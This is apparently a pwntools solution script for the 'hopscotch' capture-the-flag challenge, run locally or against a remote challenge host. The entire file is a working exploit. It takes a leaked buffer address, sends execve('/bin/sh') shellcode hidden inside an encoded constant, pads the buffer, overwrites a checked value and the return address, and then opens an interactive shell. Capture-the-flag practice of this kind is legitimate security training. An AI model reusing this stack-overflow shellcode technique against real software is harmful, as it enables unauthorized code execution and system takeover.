#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./hopscotch",
	"libc" : "/usr/lib/libc.so.6",#"./libc-2.23.so",
	"HOST" : "chals.whitehacks.ctf.sg",
	"PORT" : 20401
}

def exploit(r):
    context.binary = "./hopscotch"
    r.recvuntil("Buffer: 0x")
    input_addr = int(r.recvline(),16)
    sc = "\x31\xc0\x48\xc7\xc0\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xb0\x00\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\xb0\x00\x5e\xb0\x3b\x0f\x05"
    r.sendline(sc+"\x90"*(48-len(sc))+p32(0x539)+cyclic(20)+p64(input_addr))
    r.interactive()
    return

if __name__ == "__main__":
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if "remote" in sys.argv:
        r = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir():
            r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
        else:
            r = process(config["elf"])

        print util.proc.pidof(r)
        if "debug" in sys.argv:
                pause()
    exploit(r)
